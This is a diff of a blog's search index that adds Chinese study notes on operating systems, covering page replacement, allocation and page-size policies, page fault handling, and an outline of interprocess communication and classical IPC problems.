+<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/09/QQ%E6%88%AA%E5%9B%BE20200609125518.jpg" alt="矩阵"></p>
+<h4 id="软件模拟"><a href="#软件模拟" class="headerlink" title="软件模拟"></a>软件模拟</h4><ul>
+<li>每个页都拥有自己的标识数,每个一段时间将访问的页面对应的标识数的某位置1, 其他置0, 位数后移</li>
+<li>调出时选择标识值最小的调出</li>
+</ul>
+<h3 id="Working-Set"><a href="#Working-Set" class="headerlink" title="Working Set"></a>Working Set</h3><p>没听, 好像是把页面集中成集再调度</p>
+<h3 id="WSClock-PRA"><a href="#WSClock-PRA" class="headerlink" title="WSClock PRA"></a>WSClock PRA</h3><p>类似上面, 采用时钟模拟</p>
+<h2 id="其他需要考虑的"><a href="#其他需要考虑的" class="headerlink" title="其他需要考虑的"></a>其他需要考虑的</h2><h3 id="Local-vs-Global-Allocation-Policies"><a href="#Local-vs-Global-Allocation-Policies" class="headerlink" title="Local vs Global Allocation Policies"></a>Local vs Global Allocation Policies</h3><p>全局调度页面会使得一段时间后内存的利用趋近于实际进程所需的比例.</p>
+<h3 id="Load-Control"><a href="#Load-Control" class="headerlink" title="Load Control"></a>Load Control</h3><p>当 <strong>PFF (page fault frequency 页面失效频率)</strong> 过高时, 主动减少使用内存的进程.</p>
+<p><del>让一部分进程先跑起来</del></p>
+<h3 id="Page-Size"><a href="#Page-Size" class="headerlink" title="Page Size"></a>Page Size</h3><p>small page size (typically 4k or 8k):</p>
+<p>Advantages:</p>
+<ul>
+<li>减少内部碎片</li>
+<li>更好地适合各种数据结构和代码段</li>
+<li>减少内存中未使用的程序</li>
+</ul>
+<p>Disadvantages:</p>
+<ul>
+<li>程序需要很多页，因此产生巨大的页表</li>
+<li>传输小页所需的时间几乎与传输大页所需的时间相同, 但传输效率低</li>
+</ul>
+<h3 id="Cleaning-Policy"><a href="#Cleaning-Policy" class="headerlink" title="Cleaning Policy"></a>Cleaning Policy</h3><p>为了保证在新进程创建的时候有足够的空白页面支持, 必须时刻保证内存中有足够的空白页.</p>
+<p> <strong>paging daemon （分页守护进程）</strong>:当空白页面不足时, 会主动调出页, 但不调入页帧.</p>
+<p>也可以使用clock</p>
+<h2 id="附-Page-Fault-Handling"><a href="#附-Page-Fault-Handling" class="headerlink" title="附: Page Fault Handling"></a>附: Page Fault Handling</h2><ol>
+<li>trap 进内核, 保存PC</li>
+<li>保存进程寄存器</li>
+<li>OS 确定调入页</li>
+<li>OS 确定调出页</li>
+<li>若调出页修改过(dirty), 需要写入磁盘</li>
+<li>调入调入页</li>
+<li>更新页表</li>
+<li>恢复到页面失效的指令</li>
+<li>恢复进程</li>
+<li>恢复寄存器, 恢复PC</li>
+</ol>
 ]]></content>
       <categories>
-        <category>时与光</category>
+        <category>学习笔记</category>
+        <category>专业课</category>
+        <category>操作系统</category>
       </categories>
       <tags>
-        <tag>小结</tag>
-        <tag>周记</tag>
+        <tag>学习笔记</tag>
+        <tag>操作系统</tag>
       </tags>
   </entry>
   <entry>
@@ -1897,6 +1868,65 @@ T_0\\
       <tags>
         <tag>小结</tag>
         <tag>周记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>操作系统之进程间通信</title>
+    <url>/2020/06/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</url>
+    <content><![CDATA[<p>本章节包括两个小节</p>
+<ol>
+<li>进程间通信 (InterProess Communicatiin,IPC)</li>
+<li>经典的IPC问题</li>
+</ol>
+<a id="more"></a>
+<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>在本小节会涉及到：</p>
+<ol>
+<li>什么是临界区资源<ol>
+<li>竞争</li>
+<li>保证临界区互斥的4个条件</li>
+</ol>
+</li>
+<li>互斥的策略1 (Busy Waiting)<ol>
+<li>禁止中断</li>
+<li>锁变量</li>
+<li>严格轮换法</li>
+<li>⭐Peterson 算法</li>
+<li>TSL 指令</li>
+</ol>
+</li>
+<li>互斥的策略2<ol>
+<li>上述策略的缺陷（忙等待 优先级反向）</li>
+<li>Sleep &amp; Wakeup<ol>
+<li>问题：唤醒丢失</li>
+</ol>
+</li>
+<li>⭐信号量 Semaphore<ol>
+<li>互斥信号量 Mutexe</li>
+<li>PV操作</li>
+</ol>
+</li>
+<li>管程 Monitor</li>
+<li>消息传递</li>
+<li>屏障</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TODO：第四节：IPC</span><br></pre></td></tr></table></figure>
+<h2 id="Classical-IPC-Problems"><a href="#Classical-IPC-Problems" class="headerlink" title="Classical IPC Problems"></a>Classical IPC Problems</h2><p>本小节将涉及到几个常见IPC模型：</p>
+<ol>
+<li>生产者与消费者</li>
+<li>读者与写者</li>
+<li>进餐的哲学家</li>
+</ol>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+        <category>专业课</category>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+        <tag>操作系统</tag>
       </tags>
   </entry>
 </search>
